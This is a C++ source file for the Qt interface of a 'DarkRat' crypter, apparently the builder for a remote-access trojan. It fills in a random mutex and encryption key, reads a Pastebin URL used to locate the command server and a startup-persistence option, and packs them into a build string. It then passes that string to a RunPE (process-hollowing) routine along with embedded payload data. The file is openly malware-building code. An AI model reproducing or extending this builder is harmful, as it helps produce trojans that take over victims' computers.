#include "DarkRatCrypterUI.h"
#include <filesystem>

#include "RawBuilder.h"
#include "RunPe.h"

std::string random_string(size_t length)
{
	auto randchar = []() -> char
	{
		const char charset[] =
			"0123456789"
			"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
			"abcdefghijklmnopqrstuvwxyz";
		const size_t max_index = (sizeof(charset) - 1);
		return charset[rand() % max_index];
	};
	std::string str(length, 0);
	std::generate_n(str.begin(), length, randchar);
	return str;
}



DarkRatCrypterUI::DarkRatCrypterUI(QWidget *parent)
	: QMainWindow(parent)
{
	ui.setupUi(this);

	ui.mutex->setText(QString::fromStdString(random_string(5)));
	ui.encryptionkey->setText(QString::fromStdString(random_string(5)));
//	ui.output->setText("Output.exe");
}
char output[MAX_PATH];


void DarkRatCrypterUI::on_selectPayload_clicked()
{
	QString filename = QFileDialog::getOpenFileName(this, "Open a File", QDir::currentPath(), "Executable Files (*.exe)");
//	ui.inputFileLable->setText("File: " + filename);
}



void DarkRatCrypterUI::on_gen_mutex_clicked()
{
	ui.mutex->setText(QString::fromStdString(random_string(5)));
}

void DarkRatCrypterUI::on_gen_enckey_clicked()
{
	ui.encryptionkey->setText(QString::fromStdString(random_string(5)));
}

void DarkRatCrypterUI::on_build_clicked()
{
	
	std::string startup;
	if (ui.startup->isChecked()) {
		startup = "true";
	}
	else {
		startup = "false";
	}


	std::string pastebinURl = ui.pastebinurl->text().toStdString();
	std::string mutex = ui.mutex->text().toStdString();
	std::string encryptionKey = ui.encryptionkey->text().toStdString();


	std::string buildString = pastebinURl+" "+ mutex+" "+ startup+ " "+ encryptionKey;

	//MessageBox(NULL, TEXT("Open the message box1 "), , MB_OK | MB_SYSTEMMODAL);

	
	int status = RunPortableExecutable(rawData, buildString);
	
	ui.statusBar->showMessage(QString::fromStdString(buildString)  +" successfully builded!"+ status, 1000);
	
}
